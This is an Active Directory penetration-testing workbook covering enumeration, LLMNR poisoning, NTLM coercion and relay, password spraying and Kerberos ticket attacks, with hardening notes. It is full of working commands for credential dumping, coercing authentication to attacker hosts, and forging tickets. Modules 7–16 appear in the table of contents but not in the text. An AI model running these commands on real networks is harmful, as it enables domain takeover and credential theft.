# Active Directory Pentesting Workbook

## Table of Contents

1. [Module 1: Introduction to Active Directory](#module-1-introduction-to-active-directory)
2. [Module 2: Initial Enumeration & Reconnaissance](#module-2-initial-enumeration--reconnaissance)
3. [Module 3: LLMNR/NBT-NS Poisoning & NTLM Coercion](#module-3-llmnrnbt-ns-poisoning--ntlm-coercion)
4. [Module 4: Enumerating Users, Groups & Privileged Accounts](#module-4-enumerating-users-groups--privileged-accounts)
5. [Module 5: Password Policy & Password Spraying](#module-5-password-policy--password-spraying)
6. [Module 6: Kerberos Attacks](#module-6-kerberos-attacks)
7. [Module 7: ACL Abuse & DCSync](#module-7-acl-abuse--dcsync)
8. [Module 8: AD Certificate Services (ESC1-ESC16)](#module-8-ad-certificate-services-esc1-esc16)
9. [Module 9: Delegation Attacks & RBCD](#module-9-delegation-attacks--rbcd)
10. [Module 10: Shadow Credentials & Coercion Chains](#module-10-shadow-credentials--coercion-chains)
11. [Module 11: Domain Trust & Forest Attacks](#module-11-domain-trust--forest-attacks)
12. [Module 12: Lateral Movement & Privilege Escalation](#module-12-lateral-movement--privilege-escalation)
13. [Module 13: Persistence & Cleanup](#module-13-persistence--cleanup)
14. [Module 14: Miscellaneous Misconfigurations](#module-14-miscellaneous-misconfigurations)
15. [Module 15: Testing Checklist](#module-15-testing-checklist)
16. [References & Resources](#references--resources)

## Module 1: Introduction to Active Directory

*Skip to Module 2 if you already know AD basics: domains, forests, DCs, LDAP, Kerberos, DNs.*

### What is Active Directory?

Active Directory (AD) is Microsoft's directory service — a centralized database managing users, computers, and resources in a Windows network. Over 90% of large organizations rely on AD for authentication and authorization. For pentesters, nearly every internal engagement pivots through AD.

### Core Definitions

**Directory Service** — Stores and manages information about network objects (users, computers, printers).

**Domain** — A logical grouping of objects sharing a common AD database and security policies.

**Domain Controller (DC)** — Server holding a writable copy of the AD database; handles authentication requests.

**Forest** — One or more domains sharing a common schema and global catalog. The forest is the security boundary.

**Organizational Unit (OU)** — Container within a domain used to organize objects hierarchically.

**LDAP (Lightweight Directory Access Protocol)** — Protocol to query and modify directory services.

**Global Catalog (GC)** — A DC holding a partial replica of all objects in the forest for cross-domain searches.

**Kerberos** — Primary authentication protocol in AD. Issues time-limited tickets instead of sending passwords.

**Distinguished Name (DN)** — Unique path of an object: `CN=UserName,OU=OrgUnit,DC=domain,DC=tld`

**Common Name (CN)** — Display name attribute of an AD object.

**Domain Component (DC)** — Each segment of the domain name in a DN.

### Essential Commands

**Verify domain membership:**

```
echo %USERDOMAIN%
echo %LOGONSERVER%
whoami /groups
```

**Discover FQDN:**

```powershell
Get-ADDomain | Select-Object DNSRoot, NetBIOSName
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
```

**Enumerate Domain Controllers:**

```powershell
# PowerShell
Get-ADDomainController -Filter * | Select HostName, IPv4Address

# nltest
nltest /dclist:CORP

# LDAP
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)" name
```

**RootDSE query (find base DN):**

```
ldapsearch -x -H ldap://DC01.corp.local -s base -b "" "(objectClass=*)" defaultNamingContext
```

## Module 2: Initial Enumeration & Reconnaissance

*Gather intel anonymously and with low-privilege credentials.*

### Key Concepts

**Anonymous Bind** — Connecting to LDAP without credentials. Returns basic containers (Schema, Configuration, Domain) but no sensitive details. Many modern DCs disable this.

**Low-Privilege Account** — A regular domain user. By default, domain users can read most directory objects — this is by design and gives pentesters extensive enumeration capability.

### Top-Level Containers

After binding, you see three containers:

**Schema** — Blueprint defining every object type and attribute AD supports.

**Configuration** — Forest-wide settings: sites, services, replication topology, AD CS enrollment services.

**Domain (e.g., corp.local)** — All actual user, computer, and group objects.

### Enumeration Commands

**Anonymous LDAP bind:**

```
ldapsearch -x -H ldap://dc1.corp.local -b "DC=corp,DC=local"
```

**Authenticated LDAP bind:**

```
ldapsearch -x -H ldap://dc1.corp.local -D "CORP\User1" -w 'Pass123' -b "DC=corp,DC=local"
```

Example output — authenticated queries return additional attributes like `mail`, `description`, `title`, `manager` that anonymous binds hide.

**Naming contexts:**

```
ldapsearch -x -H ldap://dc1.corp.local -s base -b "" "(objectClass=*)" defaultNamingContext namingContexts
```

**Credentialed enumeration with PowerShell:**

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADForest
Get-ADUser -Filter * -Properties sAMAccountName, mail, title, manager | Select sAMAccountName, mail, title
```

**Computer enumeration:**

```powershell
Get-ADComputer -Filter * -Properties OperatingSystem | Select Name, OperatingSystem
```

Example output:

```
Name        OperatingSystem
----        -----
DC01        Windows Server 2022 Datacenter
WS001       Windows 11 Pro
SRV-SQL01   Windows Server 2019 Standard
```

### NetExec (nxc) — The Swiss Army Knife

NetExec (successor to CrackMapExec) handles nearly every phase of AD pentesting: recon, spraying, roasting, dumping, and lateral movement — all from one tool. Learn it well.

**Initial recon (unauthenticated):**

```
# Discover SMB hosts and domain info
nxc smb 10.0.0.0/24

# Null session enumeration
nxc smb dc1.corp.local -u '' -p '' --users
nxc smb dc1.corp.local -u '' -p '' --shares
nxc smb dc1.corp.local -u '' -p '' --pass-pol

# RID brute force (find users even when null sessions are restricted)
nxc smb dc1.corp.local -u '' -p '' --rid-brute 10000
```

**Authenticated enumeration (low-priv domain user):**

```
# Users, groups, shares, sessions, password policy — all at once
nxc smb dc1.corp.local -u user1 -p 'Pass123' --users --groups --shares --sessions --pass-pol --loggedon-users

# Enumerate admin count, descriptions, delegations
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --admin-count
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M user-desc
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --find-delegation

# Enumerate AD CS
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M adcs

# Check MachineAccountQuota
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M maq

# Check LDAP signing / channel binding
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M ldap-checker

# Check for pre-2K computer accounts (default password = lowercase hostname)
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M pre2k

# Check WebDAV (WebClient service — needed for HTTP coercion)
nxc smb 10.0.0.0/24 -u user1 -p 'Pass123' -M webdav

# Check for vulnerabilities
nxc smb dc1.corp.local -u user1 -p 'Pass123' -M zerologon
nxc smb dc1.corp.local -u user1 -p 'Pass123' -M petitpotam
nxc smb dc1.corp.local -u user1 -p 'Pass123' -M nopac

# ACL enumeration (read DACLs)
nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M daclread -o TARGET=administrator PRINCIPAL=user1 ACTION=read

# Spider shares for sensitive files
nxc smb dc1.corp.local -u user1 -p 'Pass123' -M spider_plus

# Identify SMB signing disabled (for relay targets)
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# BloodHound collection directly from nxc
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --bloodhound -c All --dns-server 10.0.0.1
```

**Kerberoasting and AS-REP roasting from nxc:**

```
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --kerberoasting kerberoast.hash
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --asreproast asrep.hash
```

**Credential dumping (requires admin):**

```
# SAM database (local accounts)
nxc smb target.corp.local -u admin -p 'P@ss!' --sam

# LSA secrets
nxc smb target.corp.local -u admin -p 'P@ss!' --lsa

# NTDS.dit (full domain dump — run against DC)
nxc smb dc1.corp.local -u administrator -p 'P@ss!' --ntds

# LSASS memory via lsassy (stealthier)
nxc smb target.corp.local -u admin -p 'P@ss!' -M lsassy
nxc smb target.corp.local -u admin -p 'P@ss!' -M nanodump

# DPAPI secrets (browser passwords, credential manager)
nxc smb target.corp.local -u admin -p 'P@ss!' --dpapi cookies
nxc smb target.corp.local -u admin -p 'P@ss!' --dpapi credentials

# LAPS passwords
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --laps

# GMSA passwords
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --gmsa

# GPP passwords (legacy cpassword in SYSVOL)
nxc smb dc1.corp.local -u user1 -p 'Pass123' -M gpp_password
```

**Lateral movement and execution from nxc:**

```
# Command execution (multiple methods)
nxc smb target.corp.local -u admin -p 'P@ss!' -x "whoami"          # CMD
nxc smb target.corp.local -u admin -p 'P@ss!' -X '$env:username'   # PowerShell
nxc winrm target.corp.local -u admin -p 'P@ss!' -x "whoami"        # WinRM
nxc wmi target.corp.local -u admin -p 'P@ss!' -x "whoami"          # WMI

# Pass-the-Hash
nxc smb target.corp.local -u admin -H aad3b435b51404ee:1122334455aabbcc -x "whoami"

# Kerberos authentication
nxc smb target.corp.local -u admin -p 'P@ss!' -k

# Delegation abuse (S4U)
nxc smb dc1.corp.local -u 'svc_web$' -p 'password' --delegate administrator --delegate-spn cifs/dc1.corp.local

# Identify where users are logged in (for targeting)
nxc smb 10.0.0.0/24 -u admin -p 'P@ss!' --loggedon-users
```

**nxc with MSSQL protocol:**

```
# Auth check
nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth

# Execute OS commands via xp_cmdshell
nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth -x "whoami"

# Execute SQL queries
nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth -q "SELECT name FROM master.dbo.sysdatabases"
```

### enum4linux-ng (SMB/RPC Enumeration)

```
# Comprehensive enumeration
enum4linux-ng -A dc1.corp.local

# With credentials
enum4linux-ng -u user1 -p 'Pass123' -A dc1.corp.local
```

### BloodHound / SharpHound Collection

BloodHound maps attack paths visually. Use SharpHound (C#) or BloodHound.py (Python) to collect data.

**SharpHound (Windows):**

```
SharpHound.exe --CollectionMethods All --Domain corp.local
```

**BloodHound.py (Linux):**

```
bloodhound-python -u user1 -p 'Pass123' -d corp.local -ns 10.0.0.1 -c All
```

Load the resulting JSON files into BloodHound CE (Community Edition) and run built-in queries like "Find Shortest Paths to Domain Admins."

### Hardening Notes

- Disable anonymous LDAP binds via GPO: **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Domain controller: LDAP server signing requirements** → Require signing.
- Restrict directory read permissions for non-essential accounts.
- Monitor LDAP query volume per account for anomalies.

## Module 3: LLMNR/NBT-NS Poisoning & NTLM Coercion

*Capture NTLMv2 hashes by spoofing name-resolution queries and coercing authentication.*

### Key Concepts

**LLMNR (Link-Local Multicast Name Resolution)** — Fallback protocol when DNS fails. Computers broadcast "Who is PRINTER1?" on the local network. Attacker responds with their own IP.

**NBT-NS (NetBIOS Name Service)** — Older fallback name resolution over NetBIOS. Same poisoning concept as LLMNR.

**mDNS (Multicast DNS)** — Another fallback protocol (port 5353). Responder can poison this too.

**NTLMv2 Hash** — Challenge-response captured during NTLM authentication. Can be cracked offline or relayed.

**NTLM Relay** — Forwarding a captured NTLM authentication to another service instead of cracking it. Far more powerful than cracking when SMB signing is disabled.

**SMB Signing** — Cryptographic signing of SMB messages. When disabled (default on workstations), NTLM relay attacks work.

**NTLM Coercion** — Forcing a machine to authenticate to your attacker-controlled server. Multiple techniques exist (see below).

### 1. LLMNR/NBT-NS Poisoning

**Responder (Linux):**

```
# Start Responder on your interface
responder -I eth0 -wPv

# Logs saved to: /usr/share/responder/logs/
```

Wait for name resolution failures on the network. When a user mistypes a share name or DNS fails, Responder answers and captures the NTLMv2 hash.

**Inveigh (Windows — when you're already on a domain-joined machine):**

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

**Extract hashes:**

```
grep "NTLMv2-SSP" /usr/share/responder/logs/*.txt > captured.hash
```

**Crack with hashcat:**

```
hashcat -m 5600 captured.hash wordlist.txt
```

### 2. NTLM Coercion Techniques (Force Authentication)

Instead of waiting for poisoning opportunities, actively force machines to authenticate to you. These are critical for relay chains.

**PetitPotam (CVE-2021-36942) — Coerce via EFS RPC:**

```
# Unauthenticated (if unpatched)
python3 PetitPotam.py attacker_ip target_dc_ip

# Authenticated
python3 PetitPotam.py -u user1 -p 'Pass123' -d corp.local attacker_ip target_dc_ip
```

**PrinterBug / SpoolSample — Coerce via Print Spooler:**

```
# Python
python3 printerbug.py corp.local/user1:'Pass123'@target_dc_ip attacker_ip

# Windows
SpoolSample.exe target_dc attacker_host
```

Requires Print Spooler service running on target (common on DCs).

**DFSCoerce — Coerce via DFS RPC:**

```
python3 dfscoerce.py -u user1 -p 'Pass123' -d corp.local attacker_ip target_dc_ip
```

**ShadowCoerce — Coerce via File Server VSS Agent:**

```
python3 shadowcoerce.py -u user1 -p 'Pass123' -d corp.local attacker_ip target_dc_ip
```

**Coercer (all-in-one — tries all coercion methods automatically):**

```
python3 Coercer.py coerce -u user1 -p 'Pass123' -d corp.local \
  --target-ip target_dc_ip --listener-ip attacker_ip
```

**WebDAV Coercion (HTTP-based — bypasses SMB signing):**

When the WebClient service runs on a target, coercion triggers HTTP auth instead of SMB. This is critical because HTTP auth can be relayed to LDAP even when SMB signing is enforced.

```
# Check for WebClient service
nxc smb 10.0.0.0/24 -u user1 -p 'Pass123' -M webdav

# Coerce via PetitPotam over HTTP
python3 PetitPotam.py -u user1 -p 'Pass123' -d corp.local attacker@80/test target_ip
```

**MSSQL Coercion (via xp_dirtree — forces SQL service account to authenticate):**

```
# On compromised MSSQL
EXEC master..xp_dirtree '\\attacker_ip\share\test';

# Capture with Responder or relay
```

### 3. NTLM Relay Attacks

**Relay to SMB (requires SMB signing disabled on target):**

```
# First, identify hosts with SMB signing disabled
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# Relay
impacket-ntlmrelayx -tf relay_targets.txt --smb2support -i
```

**Relay to LDAP (requires LDAP signing not enforced — common):**

```
# Relay to LDAP for DCSync rights
impacket-ntlmrelayx -t ldap://dc1.corp.local --escalate-user attacker_user

# Relay to LDAP for Shadow Credentials
impacket-ntlmrelayx -t ldap://dc1.corp.local --shadow-credentials --shadow-target dc1$
```

**Relay to AD CS Web Enrollment (ESC8 — see Module 8):**

```
impacket-ntlmrelayx -t http://ca-server.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
```

**Full attack chain example (PetitPotam + ESC8):**

```
# Terminal 1: Start relay to AD CS
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController

# Terminal 2: Coerce DC to authenticate to us
python3 PetitPotam.py attacker_ip dc1.corp.local

# Result: Certificate issued for DC01$ → use with Certipy to get DC hash
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
```

### 4. Post-Capture: Credential Validation

```
# Validate cracked creds via SMB
nxc smb dc1.corp.local -u jdoe -p 'Password123'

# Validate via WinRM
nxc winrm dc1.corp.local -u jdoe -p 'Password123'

# Validate via LDAP
nxc ldap dc1.corp.local -u jdoe -p 'Password123'
```

### Hardening

- **Disable LLMNR** via GPO: Computer Configuration → Administrative Templates → Network → DNS Client → **Turn off multicast name resolution** → Enabled.
- **Disable NBT-NS** via network adapter settings or DHCP option 001.
- **Enforce SMB Signing** on all machines (not just servers).
- **Enforce LDAP Signing and Channel Binding** on Domain Controllers.
- **Disable Print Spooler** on Domain Controllers.
- **Apply patches** for PetitPotam and other coercion vulnerabilities.
- **Enable Extended Protection for Authentication (EPA)** on AD CS IIS endpoints.

## Module 4: Enumerating Users, Groups & Privileged Accounts

*Find privileged users, service accounts, AS-REP roastable accounts, groups, and ACL-based shadow admins — all in one place.*

### Key Definitions

**sAMAccountName** — Pre-Windows 2000 username (e.g., `jdoe`).

**userAccountControl (UAC)** — Bitmask controlling account properties. Key flags:

| Flag | Value | Meaning |
|------|-------|---------|
| ACCOUNTDISABLE | 2 | Account is disabled |
| NORMAL_ACCOUNT | 512 | Standard enabled user |
| DONT_EXPIRE_PASSWORD | 65536 | Password never expires |
| DONT_REQUIRE_PREAUTH | 4194304 | AS-REP Roastable |

Example: `userAccountControl: 66048` = 512 (Normal) + 65536 (PwdNeverExpires).

**adminCount** — Set to `1` on accounts that are (or were) in protected groups like Domain Admins. Useful for quickly identifying high-value targets. Note: `adminCount` is sticky — it remains `1` even after removal from the group.

**Service Principal Name (SPN)** — Identifier for a service instance (e.g., `MSSQLSvc/sqlsrv.corp.local:1433`). Accounts with SPNs can be Kerberoasted.

**groupType** — Bitmask for group scope:

| Value | Meaning |
|-------|---------|
| -2147483646 | Global Security Group |
| -2147483644 | Universal Security Group |
| -2147483643 | Universal Distribution Group |

### 1. User Enumeration

**All users (LDAP):**

```
ldapsearch -x -H ldap://DC01.corp.local -D "CORP\user1" -w 'Pass123' \
  -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" \
  sAMAccountName userAccountControl adminCount description
```

**All users (PowerShell):**

```powershell
Get-ADUser -Filter * -Properties adminCount, Description, Enabled |
  Select Name, SamAccountName, adminCount, Enabled, Description
```

### 2. Privileged Users (adminCount=1)

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(adminCount=1))" \
  sAMAccountName memberOf
```

Example output:

```
sAMAccountName: Administrator
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local

sAMAccountName: svc_backup
memberOf: CN=Backup Operators,CN=Builtin,DC=corp,DC=local
```

### 3. AS-REP Roastable Accounts (DONT_REQUIRE_PREAUTH)

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl
```

### 4. Service Accounts with SPNs (Kerberoastable)

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

Example output:

```
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/sqlsrv.corp.local:1433

sAMAccountName: svc_ftp
servicePrincipalName: ftp/corp.local
```

### 5. Disabled Users (check for stale privileged accounts)

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
  sAMAccountName memberOf whenChanged
```

### 6. Group Enumeration

**All groups:**

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(objectCategory=group)" cn distinguishedName groupType
```

**Built-in groups (high-privilege):**

```
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" \
  "(objectCategory=group)" cn
```

Key built-in groups to check: Administrators, Domain Admins, Enterprise Admins, Backup Operators, Account Operators, Server Operators, Print Operators, DnsAdmins, Group Policy Creator Owners.

**Members of Domain Admins:**

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=group)(cn=Domain Admins))" member
```

**Recursive group membership (find nested DA paths):**

```
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn
```

PowerShell equivalent:

```powershell
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select Name, SamAccountName, objectClass
```

### 7. ACL-Based Shadow Admins

Accounts with `GenericAll`, `WriteDacl`, or `WriteOwner` on critical objects can escalate to DA without being in DA.

**PowerView (PowerShell):**

```powershell
Import-Module .\PowerView.ps1

# Check ACLs on Domain Admins group
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" } |
  Select IdentityReference, ActiveDirectoryRights

# Check ACLs on Users OU
Get-ObjectAcl -DistinguishedName "CN=Users,DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl" } |
  Select IdentityReference, ActiveDirectoryRights
```

Example output showing a shadow admin:

```
IdentityReference          ActiveDirectoryRights
-----------------          ---------------------
CORP\AuditGroup            WriteDacl
CORP\Domain Admins         GenericAll
```

`CORP\AuditGroup` has WriteDacl on Users OU — any member of AuditGroup can modify permissions on user objects and escalate.

**BloodHound is the best tool for this** — run "Find Shortest Paths to Domain Admins" to visualize all shadow admin paths.

### 8. GMSA (Group Managed Service Accounts) Enumeration

GMSAs have auto-rotating passwords. If you can read the `msDS-GroupMSAMembership` attribute, you can extract the password.

```powershell
# Find all gMSAs
Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership, msDS-ManagedPasswordInterval, PrincipalsAllowedToRetrieveManagedPassword

# From Linux
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
  "(objectClass=msDS-GroupManagedServiceAccount)" \
  sAMAccountName msDS-GroupMSAMembership msDS-ManagedPasswordInterval
```

**Extract GMSA password (if you're in the allowed principals):**

```
# Python - gMSADumper
python3 gMSADumper.py -u user1 -p 'Pass123' -d corp.local

# NetExec
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --gmsa
```

### 9. LAPS (Local Administrator Password Solution) Enumeration

LAPS stores local admin passwords in AD attributes. If you can read them, you get local admin on that machine.

```powershell
# Legacy LAPS (ms-Mcs-AdmPwd)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } |
  Select Name, 'ms-Mcs-AdmPwd'

# Windows LAPS (msLAPS-Password — Server 2022+)
Get-ADComputer -Filter * -Properties msLAPS-Password |
  Where-Object { $_.'msLAPS-Password' -ne $null }
```

**From Linux:**

```
# NetExec
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --laps

# ldapsearch
ldapsearch -x -H ldap://DC01.corp.local -D "CORP\user1" -w 'Pass123' \
  -b "DC=corp,DC=local" "(objectCategory=computer)" ms-Mcs-AdmPwd
```

## Module 5: Password Policy & Password Spraying

*Evaluate password policies and spray intelligently.*

### 1. Check Default Domain Password Policy

```
net accounts /domain
```

Example output:

```
Minimum password length: 7
Lockout threshold: 5
Lockout duration: 30 minutes
Maximum password age: 90 days
```

```powershell
Get-ADDefaultDomainPasswordPolicy | Format-List MinPasswordLength, LockoutThreshold, ComplexityEnabled, PasswordHistoryCount
```

### 2. Check Fine-Grained Password Policies (FGPPs)

FGPPs (Password Settings Objects) override the default policy for specific groups. `net accounts` does NOT show these.

```powershell
Get-ADFineGrainedPasswordPolicy -Filter * |
  Format-List Name, Precedence, MinPasswordLength, LockoutThreshold, 'msDS-PSOAppliesTo'
```

```
ldapsearch -x -H ldap://DC01.corp.local \
  -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" \
  "(objectClass=msDS-PasswordSettings)" \
  cn msDS-MinimumPasswordLength msDS-LockoutThreshold msDS-PSOAppliesTo
```

Example — DAs have strict PSO (14 chars, lockout at 3), service accounts have relaxed PSO (12 chars, no lockout):

```
cn: StrictAdminsPSO
msDS-MinimumPasswordLength: 14
msDS-LockoutThreshold: 3
msDS-PSOAppliesTo: CN=Domain Admins,CN=Users,DC=corp,DC=local

cn: LegacySvcPSO
msDS-MinimumPasswordLength: 12
msDS-LockoutThreshold: 0
msDS-PSOAppliesTo: CN=ServiceAccounts,OU=Groups,DC=corp,DC=local
```

### 3. Attack Decision Logic

| Condition | Action |
|-----------|--------|
| MinLength ≤ 7, Complexity off | Password spray aggressively |
| MinLength ≤ 7, Lockout ≥ 5 | Spray with 3 attempts per interval |
| MinLength ≥ 14, Strong policy | Skip spraying users — target Kerberoast/AS-REP instead |
| Service PSO with LockoutThreshold = 0 | Spray service accounts without lockout risk |

### 4. Build Target Lists

```
# All users from IT OU
ldapsearch -x -H ldap://dc1.corp.local \
  -b "OU=IT,DC=corp,DC=local" \
  "(objectCategory=person)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > targets.txt

# Users from Kerbrute (username enumeration without creds)
kerbrute userenum -d corp.local --dc dc1.corp.local usernames.txt -o valid_users.txt
```

### 5. Password Spraying

**NetExec (formerly CrackMapExec — CME is archived, use `nxc`):**

```
# Spray via LDAP (less noise than SMB)
nxc ldap dc1.corp.local -u targets.txt -p 'Spring2025!' --continue-on-success

# Spray via SMB
nxc smb dc1.corp.local -u targets.txt -p 'Spring2025!' --continue-on-success

# Spray via Kerberos (stealthiest — no NTLM events)
nxc smb dc1.corp.local -u targets.txt -p 'Spring2025!' -k --continue-on-success
```

**Kerbrute (Kerberos-based, no NTLM logs):**

```
kerbrute passwordspray -d corp.local --dc dc1.corp.local targets.txt 'Spring2025!'
```

**DomainPasswordSpray (PowerShell, from domain-joined machine):**

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Spring2025!' -OutFile sprayed.txt
```

**Validate successful credentials:**

```
nxc smb dc1.corp.local -u jdoe -p 'Spring2025!'
nxc winrm dc1.corp.local -u jdoe -p 'Spring2025!'
```

### Hardening

- Lockout threshold ≤ 3 with 30+ minute duration.
- Enforce MFA for all privileged accounts.
- Monitor Event ID 4771 (Kerberos pre-auth failure) for spray patterns.
- Use banned password lists (Azure AD Password Protection on-prem).


## Module 6: Kerberos Attacks

*Kerberoasting, AS-REP Roasting, Golden/Silver/Diamond Tickets, and S4U abuse.*

### How Kerberos Works (Quick Summary)

1. **AS-REQ** — Client sends username + encrypted timestamp to KDC.
2. **AS-REP** — KDC returns a TGT (encrypted with `krbtgt` hash).
3. **TGS-REQ** — Client presents TGT, requests access to a service (SPN).
4. **TGS-REP** — KDC returns a Service Ticket (TGS), encrypted with the service account's hash.
5. **AP-REQ** — Client presents TGS to the service for access.

Attackers target steps 2 (AS-REP Roasting), 4 (Kerberoasting), and forge tickets at steps 2 (Golden) and 4 (Silver/Diamond).

### 1. Kerberoasting

Request TGS tickets for service accounts with SPNs, then crack them offline. The TGS is encrypted with the service account's password hash — weak passwords crack fast.

**Impacket (Linux):**

```
impacket-GetUserSPNs -request -dc-ip dc1.corp.local corp.local/user1:'Pass123' -outputfile kerberoast.hash
```

**NetExec (one-liner):**

```
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --kerberoasting kerberoast.hash
```

**Rubeus (Windows):**

```
Rubeus.exe kerberoast /outfile:kerberoast.hash
```

**Crack:**

```
hashcat -m 13100 kerberoast.hash wordlist.txt
```

**Targeted Kerberoast (specific user):**

```
impacket-GetUserSPNs -request -dc-ip dc1.corp.local corp.local/user1:'Pass123' -request-user svc_sql
```

### 2. AS-REP Roasting

Accounts with `DONT_REQUIRE_PREAUTH` flag send an AS-REP encrypted with the user's hash without authenticating first. Extract and crack.

**Impacket (Linux):**

```
impacket-GetNPUsers -dc-ip dc1.corp.local corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash
```

**NetExec (one-liner):**

```
nxc ldap dc1.corp.local -u user1 -p 'Pass123' --asreproast asrep.hash
```

**Rubeus (Windows):**

```
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
```

**Crack:**

```
hashcat -m 18200 asrep.hash wordlist.txt
```

### 3. Golden Ticket

Forged TGT using the `krbtgt` account hash. Grants unrestricted domain access for the ticket lifetime (default 10 hours, renewable 7 days).

**Prerequisite:** You need the `krbtgt` NTLM hash (obtained via DCSync — see Module 7).

**Impacket:**

```
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc1.corp.local
```

**Mimikatz:**

```
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

**Rubeus:**

```
Rubeus.exe golden /aes256:<krbtgt_aes256_key> /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt
```

### 4. Silver Ticket

Forged TGS for a specific service using that service account's hash. Does NOT contact the KDC — harder to detect than Golden Tickets, but limited to one service.

```
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... -domain corp.local -spn MSSQLSvc/sqlsrv.corp.local:1433 Administrator
```

### 5. Diamond Ticket (Modern Alternative to Golden Ticket)

A Diamond Ticket modifies a legitimately requested TGT rather than forging one from scratch. This makes it harder to detect because it contains valid encrypted data from the KDC.

**Rubeus:**

```
Rubeus.exe diamond /krbkey:<krbtgt_aes256_key> /user:Administrator /domain:corp.local /dc:dc1.corp.local /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

The key difference: Golden Tickets are entirely forged (detectable by PAC validation). Diamond Tickets decrypt a real TGT, modify the PAC, re-encrypt — passing validation checks.

### 6. Sapphire Ticket

Similar to Diamond Ticket but uses S4U2Self + U2U to obtain a legitimate PAC for the target user, then inserts it into the modified ticket. Even harder to detect.

```
impacket-ticketer -request -impersonate Administrator -domain corp.local -domain-sid S-1-5-21-... -aesKey <krbtgt_aes256_key> -nthash <krbtgt_hash> Administrator
```

### 7. Pass-the-Ticket (PtT)

Inject an existing Kerberos ticket into your session.

```
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi

# Linux
export KRB5CCNAME=/path/to/ticket.ccache
```

### 8. UnPAC-the-Hash

After obtaining a certificate (e.g., from AD CS abuse), use PKINIT to get a TGT, then use U2U to extract the account's NT hash.

```
# Get TGT via PKINIT
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1

# Output includes NT hash:
# [*] Got hash for 'administrator@corp.local': aad3b435b51404ee:1122334455...
```

This is how AD CS certificate abuse translates into usable NTLM hashes.

### Hardening

- Use AES-only Kerberos (disable RC4/DES via GPO).
- Enforce long, random passwords on all service accounts (30+ chars).
- Use Group Managed Service Accounts (gMSAs) instead of regular service accounts.
